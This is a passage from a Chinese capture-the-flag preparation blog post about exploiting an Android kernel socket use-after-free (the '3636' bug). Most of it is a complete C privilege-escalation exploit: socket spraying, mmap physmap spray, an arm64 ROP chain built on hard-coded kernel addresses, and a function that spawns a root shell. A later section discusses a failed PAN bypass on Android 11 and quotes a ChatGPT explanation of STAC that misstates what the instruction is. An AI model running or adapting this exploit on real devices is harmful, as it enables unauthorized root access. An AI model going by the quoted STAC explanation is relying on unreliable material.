class="line">    <span class="keyword">int</span> found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vuln_sock_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = num ; i &lt; MAX_SOCK_NUM; i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;time, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(time));</span><br><span class="line">        ret = ioctl(vuln_sock[i], SIOCGSTAMPNS, &amp;time);</span><br><span class="line">        value = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; mmap_page_count; j++)&#123;</span><br><span class="line">            compare_value = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)mmap_per_page[j]+SK_STAMP_OFFSET);</span><br><span class="line">            <span class="keyword">if</span>( value == compare_value)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\\n [-] found a vuln sock, index: %d, maigc value: 0x%llx\\n&quot;</span>,i,value);</span><br><span class="line">                vuln_sock_index = i;</span><br><span class="line">                vuln_page = mmap_per_page[j];</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(found == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(found == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [-] returned to user space.\\n [-] here is a root shell\\n&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; [-] failed to get root\\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rop_get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i,j,ret;</span><br><span class="line">    <span class="keyword">void</span>* stack_addr = &amp;j;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] prepare rop gadget.\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* map_addr_1 = mmap(<span class="number">0</span>, MAP_STACK_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* map_addr_2 = mmap(<span class="number">0</span>, MAP_STACK_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">void</span>* map_addr_3 = mmap(<span class="number">0</span>, MAP_STACK_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(map_addr_1,<span class="number">0x0</span>,MAP_STACK_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(map_addr_2,<span class="number">0x0</span>,MAP_STACK_SIZE);</span><br><span class="line">    <span class="built_in">memset</span>(map_addr_3,<span class="number">0x0</span>,MAP_STACK_SIZE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> idx_1 = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_2;        <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc0000d9384</span>;        <span class="comment">// x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x3f20</span>;        <span class="comment">// x19  x0+x19</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// x20</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc0000f1194</span>;        <span class="comment">// x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;         <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc0004ceab0</span>;        <span class="comment">// x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_2+<span class="number">0x38</span>;        <span class="comment">// x19</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// x20</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_2;            <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc0004f7138</span>;            <span class="comment">//x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_2;        <span class="comment">// x19</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// x20</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// dirt</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// x9 will be stored here</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_3;        <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc0000d9384</span>;        <span class="comment">// x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;            <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc000132cb8</span>;                <span class="comment">// x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0xffffffc000084240</span>;            <span class="comment">// x30</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;        </span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1)[idx_1++] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> idx_2 = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2)[idx_2++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_2;            <span class="comment">// x0</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2)[idx_2++] = <span class="number">0x0</span>;            <span class="comment">// x0</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2)[idx_2++] = <span class="number">0x0</span>;            <span class="comment">// x0</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2)[idx_2++] = <span class="number">0xffffffc0002999ec</span>;    <span class="comment">// x1    blr x1,(x0 +=x19)</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2)[idx_2++] = <span class="number">0x0</span>;            <span class="comment">// x29</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2)[idx_2++] = <span class="number">0x0</span>;            <span class="comment">// x30</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">char</span>*)map_addr_2+<span class="number">0x1b0</span>) = <span class="number">0xffffffc00009e8b8</span>;  <span class="comment">// ldr x8,[x8,0x1b0]</span></span><br><span class="line">    <span class="comment">// ((unsigned long long *)map_addr_2)[0x1b0] = 0xffffffc00009e8b8;  // ldr x8,[x8,0x1b0]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> idx_3 = <span class="number">0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3)[idx_3++]  = <span class="number">0xffffffc000084290</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3)[idx_3++]  = <span class="number">0x0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3)[idx_3++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)map_addr_3;    <span class="comment">// x0</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3)[idx_3++] = <span class="number">0x0</span>;        <span class="comment">// x1</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3)[idx_3++] = <span class="number">0x0</span>;</span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3)[idx_3++] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [-] call colse(vuln_sock) to trigger a rip hijack\\n&quot;</span>);</span><br><span class="line">    <span class="comment">// close(vuln_sock[vuln_sock_index]);</span></span><br><span class="line">    <span class="keyword">int</span> target_sock = vuln_sock[vuln_sock_index];</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X0, %3 \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X1, =0xFFFFFFC0000C0014 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X2, =0x0 \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X3, =0xFFFFFFC0006EB94C \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X5, =0xFFFFFFC0000BFAB4 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X6, =0x06060606 \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X7, =0X07070707 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X8, =0x39 \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X9, =0xffffffc00025bc94 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X17, =0xffffffc0000876a0 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X18, =0x18181818 \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X20, %1 \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X21, =0xffffffc000204894 \\n\\t&quot;</span>  </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X24, =get_shell \\n\\t&quot;</span>   </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X25, =0x0 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;LDR     X26, %2 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">&quot;SVC    #0 \\n\\t&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;=r&quot;</span> (ret)</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;m&quot;</span> (map_addr_1), <span class="string">&quot;m&quot;</span> (stack_addr), <span class="string">&quot;m&quot;</span> (target_sock)</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">&quot;x0&quot;</span>, <span class="string">&quot;x1&quot;</span>, <span class="string">&quot;x2&quot;</span>, <span class="string">&quot;x3&quot;</span>, <span class="string">&quot;x5&quot;</span>, <span class="string">&quot;x8&quot;</span>, <span class="string">&quot;x9&quot;</span>, <span class="string">&quot;x17&quot;</span>, <span class="string">&quot;x20&quot;</span>, <span class="string">&quot;x21&quot;</span>, <span class="string">&quot;x24&quot;</span>, <span class="string">&quot;x25&quot;</span>, <span class="string">&quot;x26&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,ret;</span><br><span class="line"></span><br><span class="line">    ret = maximize_fd_limit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] set rlimlit, now rlim.rlim_cur: %d\\n&quot;</span>,ret);</span><br><span class="line">    mmap200200();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap 0x200200 to avoid crash\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 1: create vuln socks\\n&quot;</span>);</span><br><span class="line">    create_vuln_socks();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 2: mmap spray to overwrite vuln socks\\n&quot;</span>);</span><br><span class="line">    mmap_spray();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 3: find the target sk\\n&quot;</span>);</span><br><span class="line">    ret = find_target_sk(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;didn&#x27;t find a usable sock...\\n&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] step 4: rop to get root shell\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get root</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> add_sp_0x100 = <span class="number">0xffffffc000118458</span>;           <span class="comment">// 0xffffffc000118458 : add sp, sp, #0x100 ; ret</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page) = add_sp_0x100;            <span class="comment">// inet_release(): LDR X2, [X2]; BLR X2;</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x28</span>) = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)vuln_page;           <span class="comment">// inet_release(): LDR X2, [X19,#0x28]; </span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">char</span>*)vuln_page+<span class="number">0x2A0</span>) = <span class="number">0x0</span>;               <span class="comment">// ip_mc_drop_socket(): LDR X1, [X0,#0x2A0]; CBZ X1, loc_FFFFFFC000432440</span></span><br><span class="line"></span><br><span class="line">    rop_get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;should never be there!\\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


<p>ROP打通那一刻真的超级开心！！！虽然说通用性没那么强，但着实锻炼了找 arm64 rop gadget 的能力。</p>
<p><img   src="./image-20230903213052902.png?size=600" style="width: 600px;"  alt="image-20230903213052902"></p>

        <h1 id="android-11-环境下3636的利用"   >
          <a href="#android-11-环境下3636的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#android-11-环境下3636的利用" class="headerlink" title="android 11 环境下3636的利用"></a>android 11 环境下3636的利用</h1>
      
        <h2 id="基本信息-2"   >
          <a href="#基本信息-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h2>
      <p>架构：aarch64</p>
<p>linux版本：5.4.40</p>
<p>防护措施：开启KASLR，PAN，PXN，CFI，selinux</p>
<p>这个题卡在内核访问0x200200这个地址会崩溃上，PAN不知道怎么绕。</p>
<p>搜索PAN绕过方法时，仅找到这篇文章：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.siguza.net/PAN/" >https://blog.siguza.net/PAN/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> ，意思是用户态映射一个 <code>--x</code> 权限的页面时，内核直接访问该页面并不会触发PAN。</p>
<p>我在android 11这个环境里试了一下，没成功。。</p>
<p>于是又冒出个很业余的想法，copy_from_user()执行的时候内核必须要访问用户态，是不是说明会短暂关闭PAN？那让某个线程在copy_from_user()期间卡住，其他内核线程是不是就可以访问任意用户态地址，从而绕过PAN了？事实证明linux内核远没有这么简单，无论是X86还是ARM，copy_from_user() 时都没有动过全局的SMEP/PAN开关，而是通过一些 “状态寄存器+硬件功能” 结合的方式将控制粒度细化到线程级别。</p>
<p>以下是对 copy_from_user() 函数的一些理解：</p>
<ol>
<li><p>在开启SMAP的机器上，copy_from_user()是如何将用户态数据拷贝到内核态的？【✔】</p>
<p>SMAP是硬件的特性，由CR4寄存器控制是否开启该特性。copy_from_user()执行的过程中，不会改变CR4寄存器中SMAP的标记位，而是通过 STAC 让当前代码具备访问用户空间的能力。完成拷贝后，又通过 CLAC 关闭该能力。</p>
<p>这一信息的来源是stackoverflow上的一篇回答：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://stackoverflow.com/a/61498446" >https://stackoverflow.com/a/61498446</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>紧接着，根据 STAC CLAC 搜到了一些中文文章：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/64536162" >https://zhuanlan.zhihu.com/p/64536162</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>官方邮件：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lwn.net/Articles/517251/" >https://lwn.net/Articles/517251/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>wiki中的解释：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention" >https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>chatgpt对 STAC指令的一些解释：</p>
<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在x86架构中，STAC（Supervisor-Trap Access Control）并不是一条独立的指令，而是通过修改 EFLAGS 寄存器中的一个标志位来实现的。具体来说，STAC特性通过修改 EFLAGS 寄存器中的 AC（Alignment Check）标志位来启用或禁用。</span><br><span class="line"></span><br><span class="line">当 AC 标志位被置为 1 时，STAC 特性被启用，表示在内核模式下执行的代码要执行用户空间数据访问。如果在这个模式下尝试访问用户空间数据，将会触发一个异常。这个异常可以被内核捕获和处理，从而增加对用户空间数据的保护。</span><br><span class="line"></span><br><span class="line">需要注意的是，修改 EFLAGS 寄存器中的 AC 标志位是特权级别 0 的操作，即内核模式下才能执行。用户空间代码不能直接访问 EFLAGS 寄存器或修改其中的标志位。</span><br><span class="line"></span><br><span class="line">STAC 特性通常与 SMAP（Supervisor Mode Access Prevention）一起使用，以提供更强大的内存访问控制和安全保护。SMAP用于阻止内核模式下的代码直接访问用户空间的数据，而 STAC 用于在内核模式下执行用户空间的数据访问，并触发异常以进行后续处理。这两个特性结合起来，可以增加对用户空间数据的保护。</span><br></pre></td></tr></table></div></figure>
<p>源于：突然有个神奇的想法，以为copy_from_user()执行期间，会关闭SMAP/PAN。那么只要通过userfaultfd或者fuse让copy_from_user()卡住，那么其他内核线程不就可以绕过SMAP/PAN，实现任意用户空间访问了吗？</p>
<p>答案：事实远没有这么简单，因为copy_from_user()执行期间，不会去动CR4或者CP15寄存器，而是设置flag寄存器。所以完全不会发生我上面说的那种情况。</p>
</li>
<li><p>arm/aarch64架构上的copy_from_user()是如何将用户态数据拷贝到内核态的？【✔】</p>
<p>PAN，涉及哪些寄存器？flag寄存器又是什么？</p>
<p>aarch64上每个线程有自己的 <code>thread_info→ttbr0</code> 寄存器。刚陷入内核态时，ttbr0_el1是空的，因为进入内核后不需要访问用户态空间，相当于一个天然的KPTI防护。当遇到copy_from_user()之类的函数需要访问用户态空间时，会将<code>thread_info→ttbr0</code> 的值给 ttbr0_el1，这样就可以访问用户态了。</p>
<p>那么，疑问来了，ttbr0_el1是全局的，被设置后，其他线程是不是就可以访问该线程的用户空间呢？当然不行，分两种情况。1、对于后来新起的线程，进入内核时，ttbr0_el1会被清零，不会接触到上一个线程的残留数据。2、对于之前已经存在的线程，在线程切换时，这些寄存器都会更新，也不会接触到残留数据。所以，这个拷贝方案是安全的。</p>
<p>补充：关于arm64 linux下的copy_from_user可以参考这篇文章 - <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.wowotech.net/memory_management/454.html" >copy_{to,from}_user()的思考</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</li>
</ol>
<p>最后，问了主办方这个题有没有解，主办方说目前没有解，做开放讨论。ok，那我这水平也可以放弃跟这道题较劲了。。</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/09/03/230903-geekcon-prepare/">http://blingblingxuanxuan.github.io/2023/09/03/230903-geekcon-prepare/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kernel-pwn/">kernel pwn</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/android/">android</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/09/05/230905-kStackOverflow/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">GeekCon AVSS 2023 Qualifier - kStackOverflow</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/07/05/230705-sctf2023-kernel-pwn-sycrop/"><span class="paginator-prev__text">SCTF 2023 Kernel Pwn Sycrop</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#android-5-1%E7%8E%AF%E5%A2%83%E4%B8%8B3636%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">
          android 5.1环境下3636的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">
          基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">
          漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">
          漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81-physmap-spray"><span class="toc-number">1.3.1.</span> <span class="toc-text">
          控制流劫持 - physmap spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-root-shell-ret2usr"><span class="toc-number">1.3.2.</span> <span class="toc-text">
          get root shell - ret2usr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">1.3.3.</span> <span class="toc-text">
